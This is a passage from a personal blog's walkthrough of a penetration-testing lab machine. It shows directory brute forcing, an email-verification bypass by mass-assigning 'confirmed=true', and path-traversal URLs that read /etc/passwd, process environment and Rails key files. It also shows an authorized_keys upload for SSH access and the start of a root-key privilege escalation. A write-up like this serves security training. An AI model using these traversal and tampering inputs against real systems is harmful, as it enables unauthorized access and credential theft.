+Just a blank page with text and “We’re not” in an HTML comment…
+<img src="../../../attachments/Pasted-image-20250714173707.png" width="auto" height="auto" alt/></p>
+<p>Since nmap saw this is Apache 2.4.38, I decided to look into CVEs for this version and found a privilege escalation exploit, EDB 46676. I will keep this in mind to investigate after gaining initial access.</p>
+<p><img src="../../../attachments/Pasted-image-20250714173556.png" width="auto" height="auto" alt/></p>
+<p>Brute forcing directories again reveals some interesting-sounding pages that we mostly don’t have access to:</p>
+<pre><code>admin                   [Status: 301, Size: 327, Words: 20, Lines: 10, Duration: 107ms]
+.htpasswd               [Status: 403, Size: 283, Words: 20, Lines: 10, Duration: 5301ms]
+                        [Status: 200, Size: 189, Words: 21, Lines: 10, Duration: 6305ms]
+cgi-bin                 [Status: 301, Size: 329, Words: 20, Lines: 10, Duration: 101ms]
+cgi-bin/                [Status: 403, Size: 283, Words: 20, Lines: 10, Duration: 132ms]
+.htaccess               [Status: 403, Size: 283, Words: 20, Lines: 10, Duration: 98ms]
+.hta                    [Status: 403, Size: 283, Words: 20, Lines: 10, Duration: 324ms]
+index.php               [Status: 200, Size: 189, Words: 21, Lines: 10, Duration: 116ms]
+info                    [Status: 301, Size: 326, Words: 20, Lines: 10, Duration: 106ms]
+server-status           [Status: 403, Size: 283, Words: 20, Lines: 10, Duration: 118ms]
+</code></pre>
+<h2 id="port-80---http">Port 80 - HTTP<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#port-80---http" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
+<p>Redirects us to /login.</p>
+<p><img src="../../../attachments/Pasted-image-20250714171653.png" width="auto" height="auto" alt/></p>
+<p>We discover some pages by brute forcing endpoints, but none of them are actually useful:</p>
+<p><code>ffuf -u $URL/FUZZ -w /usr/share/wordlists/dirb/common.txt</code></p>
+<pre><code>404                     [Status: 200, Size: 1722, Words: 310, Lines: 68, Duration: 124ms]
+500                     [Status: 200, Size: 1635, Words: 289, Lines: 67, Duration: 128ms]
+favicon.ico             [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 126ms]
+filemanager             [Status: 302, Size: 94, Words: 5, Lines: 1, Duration: 116ms]
+login                   [Status: 200, Size: 2413, Words: 452, Lines: 59, Duration: 139ms]
+register                [Status: 200, Size: 2765, Words: 548, Lines: 66, Duration: 154ms]
+robots.txt              [Status: 200, Size: 99, Words: 12, Lines: 2, Duration: 109ms]
+</code></pre>
+<ul>
+<li>404 is a generic 404 redirect page for Ruby on Rails (“Ruby” appears in the page’s source, and this agrees with <a href="https://www.wappalyzer.com/" class="external">wappalyzer<svg aria-hidden="true" class="external-icon" style="max-width:0.8em;max-height:0.8em;" viewBox="0 0 512 512"><path d="M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z"></path></svg></a>’s guess.)</li>
+<li>500 is another redirect page</li>
+<li>filemanager redirects to /login</li>
+<li>robots.txt doesn’t contain anything useful</li>
+</ul>
+<p>Line 50 of the /login page source (the line below “The Only True Free Storage”) contains an interesting HTML comment:
+<code>&lt;!-- The only True wisdom is in knowing you know nothing --></code></p>
+<p>I tried a few common user/password combinations but was unable to get in. I’ll create an account to explore the application further.</p>
+<p><img src="../../../attachments/Pasted-image-20250714172102.png" width="auto" height="auto" alt/></p>
+<p><img src="../../../attachments/Pasted-image-20250714172121.png" width="auto" height="auto" alt/></p>
+<h3 id="bypassing-email-verification">Bypassing email verification<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#bypassing-email-verification" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<p>When trying to sign in, it prompts us again to check email for a verification code.</p>
+<p>After editing edit and confirming the email, the response contains a JSON object that caught my attention.</p>
+<p><img src="../../../attachments/Pasted-image-20250714181505.png" width="auto" height="auto" alt/></p>
+<p><img src="../../../attachments/Pasted-image-20250714181525.png" width="auto" height="auto" alt/></p>
+<p>There is a variable “confirmed” which is marked as false. By copying the syntax of the other variables included in the patch request, we can actually append <code>&amp;user%5Bconfirmed%5D=true</code> to update the confirmed variable to true. Then returning to /, we’re signed in!</p>
+<p><img src="../../../attachments/Pasted-image-20250714182343.png" width="auto" height="auto" alt/></p>
+<p><img src="../../../attachments/Pasted-image-20250714182514.png" width="auto" height="auto" alt/></p>
+<p>I’ll grab my session cookie and start another directory brute force (didn’t find anything new)</p>
+<pre><code>ffuf -u $URL/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -b '_boolean_session=MORkJifOsYCOg43S8bNhUSibVrLMG073KoIZr
+g%2BHa8kU3trvOKZsnxVNfpg%2BfACVhXbHRfRBcLSYc1h6XA9DRJvom7nTwMqHpuIFOw1fS7%2BI4p2%2F7rv9swkSgUTGaZY9w3WxKeQEuBlbX4Nbc1MWZEASb%2BDZgXwG9Jy9aXtG70P
+otBhR0e78MfSGrA5S3a0arDrUELQB0DoDW0fk%2FR66WaHDcpgYkLF9v6lUohQh9XK%2BYDnqwuN6wM2ygT9qyASSdjK%2FMp699ubykKSgvkcFC2NThV6GT6cVAcnB5XpVoezExHhSINpoC
+Q%3D%3D--v3JROaxJm1rU1Gpc--uqoJttvIG30FdUwDaA1a8A%3D%3D'
+</code></pre>
+<p>Tinkering with the URL, I found that the file manager is vulnerable to LFI via the cwd and file URL parameters — we can download /etc/passwd at:
+<code>http://192.168.126.231/?cwd=../../../../../../../../etc/&amp;file=passwd&amp;download=true</code></p>
+<p>It change to <code>http://192.168.126.231/?cwd=&amp;file=../../../../../../../../etc/passwd&amp;download=true</code> after, but only the first URL specifies the directory and downloads the file correctly.</p>
+<pre><code>root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
+sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+remi:x:1000:1000::/home/remi:/bin/bash
+mysql:x:106:112:MySQL Server,,,:/nonexistent:/bin/false
+</code></pre>
+<p>Testing common Ruby and environment files for LFI:</p>
+<ul>
+<li><code>http://192.168.126.231/?cwd=../../../../../../../../var/www/boolean/config/&amp;file=database.yml&amp;download=true</code></li>
+<li><code>http://192.168.126.231/?cwd=../../../../../../../../var/www/boolean/config/&amp;file=master.key&amp;download=true</code></li>
+<li><code>http://192.168.126.231/?cwd=../../../../../../../../var/www/boolean/config/&amp;file=credentials.yml.enc&amp;download=true</code></li>
+<li><code>http://192.168.126.231/?cwd=../../../../../../../../proc/self&amp;file=environ&amp;download=true</code>
+<ul>
+<li><code>LANG=en_US.UTF-8�PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin�HOME=/home/remi�LOGNAME=remi�USER=remi�SHELL=/bin/bash�INVOCATION_ID=12ce1e010e1146f487f1c27b3f727702�JOURNAL_STREAM=9:17708�WEB_CONCURRENCY=2�RAILS_MAX_THREADS=100�RAILS_ENV=development�</code></li>
+</ul>
+</li>
+<li><code>http://192.168.126.231/?cwd=../../../../../../../../proc/self&amp;file=environ&amp;download=true</code>
+<ul>
+<li><code>puma: cluster worker 1: 832 [boolean]������������������������������������������������������������������</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="initial-access-via-ssh-authorized_keys-file-upload">Initial Access via SSH authorized_keys File Upload<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#initial-access-via-ssh-authorized_keys-file-upload" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<p>I finally realized we’re actually able to list directories as well, by specifying it as the file name. This would have saved me a lot of trouble of just guessing files blindly… We can use this to list /home/remi/.ssh:</p>
+<p><code>http://192.168.126.231/?cwd=../../../../../../../../home/remi&amp;file=.ssh&amp;download=true</code></p>
+<p><img src="../../../attachments/Pasted-image-20250714190904.png" width="auto" height="auto" alt/></p>
+<p>In .ssh/keys there is a private key simply named root, but using it to try connecting as root still prompts for password. Perhaps we can use this after connecting as privilege escalation.</p>
+<p>Still, since we’re able to upload to this location, we can create an SSH key and upload an  authorized_keys file permitting our key for remi.</p>
+<p><code>ssh-keygen</code>
+<code>cat ~/.ssh/id_ed25519.pub > authorized_keys</code>
+(upload authorized_keys to /home/remi/.ssh/authorized_keys on target)</p>
+<p><img src="../../../attachments/Pasted-image-20250714193229.png" width="auto" height="auto" alt/></p>
+<p>First flag is in <code>/home/remi/local.txt</code>.</p>
+<h1 id="privilege-escalation">Privilege Escalation<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#privilege-escalation" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h1>
+<p><code>ssh root@localhost -i root</code></p>
+<pre><code>Received disconnect from 127.0.0.1 port 22:2: Too many authentication failures
+Disconnected from 127.0.0.1 port 22
+</code></pre>
+<p>I learned that -i only adds a key to OpenSSH client’s identities, it doesn’t tell it to ONLY use that one. Because of this, each time I tried connecting, it would try to use the 3 id keys in /home/remi/.ssh/keys and fail before using root. The solution is to use <code>-o IdentitiesOnly=yes</code> which prevents the cilent from trying its other identities.</p>
+<p><img src="../../../attachments/Pasted-image-20250714194603.png" width="auto" height="auto" alt/></p></article><hr/><div class="page-footer"></div></div><footer class><p>Created with <a href="https://quartz.jzhao.xyz/">Quartz v4.5.0</a> © 2026</p><ul><li><a href="https://cameroncandau.com">cameroncandau.com</a></li></ul></footer></div></div></body><script type="application/javascript">function o(){let t=this.parentElement;t.classList.toggle("is-collapsed");let e=t.classList.contains("is-collapsed")?this.scrollHeight:t.scrollHeight;t.style.maxHeight=e+"px";let c=t,l=t.parentElement;for(;l;){if(!l.classList.contains("callout"))return;let i=l.classList.contains("is-collapsed")?l.scrollHeight:l.scrollHeight+c.scrollHeight;l.style.maxHeight=i+"px",c=l,l=l.parentElement}}function n(){let t=document.getElementsByClassName("callout is-collapsible");for(let s of t){let e=s.firstElementChild;if(!e)continue;e.addEventListener("click",o),window.addCleanup(()=>e.removeEventListener("click",o));let l=s.classList.contains("is-collapsed")?e.scrollHeight:s.scrollHeight;s.style.maxHeight=l+"px"}}document.addEventListener("nav",n);
+</script><script type="module">function f(i,e){if(!i)return;function r(o){o.target===this&&(o.preventDefault(),o.stopPropagation(),e())}function t(o){o.key.startsWith("Esc")&&(o.preventDefault(),e())}i?.addEventListener("click",r),window.addCleanup(()=>i?.removeEventListener("click",r)),document.addEventListener("keydown",t),window.addCleanup(()=>document.removeEventListener("keydown",t))}function y(i){for(;i.firstChild;)i.removeChild(i.firstChild)}var h=class{constructor(e,r){this.container=e;this.content=r;this.setupEventListeners(),this.setupNavigationControls(),this.resetTransform()}isDragging=!1;startPan={x:0,y:0};currentPan={x:0,y:0};scale=1;MIN_SCALE=.5;MAX_SCALE=3;cleanups=[];setupEventListeners(){let e=this.onMouseDown.bind(this),r=this.onMouseMove.bind(this),t=this.onMouseUp.bind(this),o=this.resetTransform.bind(this);this.container.addEventListener("mousedown",e),document.addEventListener("mousemove",r),document.addEventListener("mouseup",t),window.addEventListener("resize",o),this.cleanups.push(()=>this.container.removeEventListener("mousedown",e),()=>document.removeEventListener("mousemove",r),()=>document.removeEventListener("mouseup",t),()=>window.removeEventListener("resize",o))}cleanup(){for(let e of this.cleanups)e()}setupNavigationControls(){let e=document.createElement("div");e.className="mermaid-controls";let r=this.createButton("+",()=>this.zoom(.1)),t=this.createButton("-",()=>this.zoom(-.1)),o=this.createButton("Reset",()=>this.resetTransform());e.appendChild(t),e.appendChild(o),e.appendChild(r),this.container.appendChild(e)}createButton(e,r){let t=document.createElement("button");return t.textContent=e,t.className="mermaid-control-button",t.addEventListener("click",r),window.addCleanup(()=>t.removeEventListener("click",r)),t}onMouseDown(e){e.button===0&&(this.isDragging=!0,this.startPan={x:e.clientX-this.currentPan.x,y:e.clientY-this.currentPan.y},this.container.style.cursor="grabbing")}onMouseMove(e){this.isDragging&&(e.preventDefault(),this.currentPan={x:e.clientX-this.startPan.x,y:e.clientY-this.startPan.y},this.updateTransform())}onMouseUp(){this.isDragging=!1,this.container.style.cursor="grab"}zoom(e){let r=Math.min(Math.max(this.scale+e,this.MIN_SCALE),this.MAX_SCALE),t=this.content.getBoundingClientRect(),o=t.width/2,n=t.height/2,c=r-this.scale;this.currentPan.x-=o*c,this.currentPan.y-=n*c,this.scale=r,this.updateTransform()}updateTransform(){this.content.style.transform=`translate(${this.currentPan.x}px, ${this.currentPan.y}px) scale(${this.scale})`}resetTransform(){this.scale=1;let e=this.content.querySelector("svg");this.currentPan={x:e.getBoundingClientRect().width/2,y:e.getBoundingClientRect().height/2},this.updateTransform()}},C=["--secondary","--tertiary","--gray","--light","--lightgray","--highlight","--dark","--darkgray","--codeFont"],E;document.addEventListener("nav",async()=>{let e=document.querySelector(".center").querySelectorAll("code.mermaid");if(e.length===0)return;E||=await import("https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.4.0/mermaid.esm.min.mjs");let r=E.default,t=new WeakMap;for(let n of e)t.set(n,n.innerText);async function o(){for(let s of e){s.removeAttribute("data-processed");let a=t.get(s);a&&(s.innerHTML=a)}let n=C.reduce((s,a)=>(s[a]=window.getComputedStyle(document.documentElement).getPropertyValue(a),s),{}),c=document.documentElement.getAttribute("saved-theme")==="dark";r.initialize({startOnLoad:!1,securityLevel:"loose",theme:c?"dark":"base",themeVariables:{fontFamily:n["--codeFont"],primaryColor:n["--light"],primaryTextColor:n["--darkgray"],primaryBorderColor:n["--tertiary"],lineColor:n["--darkgray"],secondaryColor:n["--secondary"],tertiaryColor:n["--tertiary"],clusterBkg:n["--light"],edgeLabelBackground:n["--highlight"]}}),await r.run({nodes:e})}await o(),document.addEventListener("themechange",o),window.addCleanup(()=>document.removeEventListener("themechange",o));for(let n=0;n<e.length;n++){let v=function(){let g=l.querySelector("#mermaid-space"),m=l.querySelector(".mermaid-content");if(!m)return;y(m);let w=c.querySelector("svg").cloneNode(!0);m.appendChild(w),l.classList.add("active"),g.style.cursor="grab",u=new h(g,m)},M=function(){l.classList.remove("active"),u?.cleanup(),u=null},c=e[n],s=c.parentElement,a=s.querySelector(".clipboard-button"),d=s.querySelector(".expand-button"),p=window.getComputedStyle(a),L=a.offsetWidth+parseFloat(p.marginLeft||"0")+parseFloat(p.marginRight||"0");d.style.right=`calc(${L}px + 0.3rem)`,s.prepend(d);let l=s.querySelector("#mermaid-container");if(!l)return;let u=null;d.addEventListener("click",v),f(l,M),window.addCleanup(()=>{u?.cleanup(),d.removeEventListener("click",v)})}});
+</script><script src="https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/contrib/copy-tex.min.js" type="application/javascript"></script><script src="../../../postscript.js" type="module"></script></html>
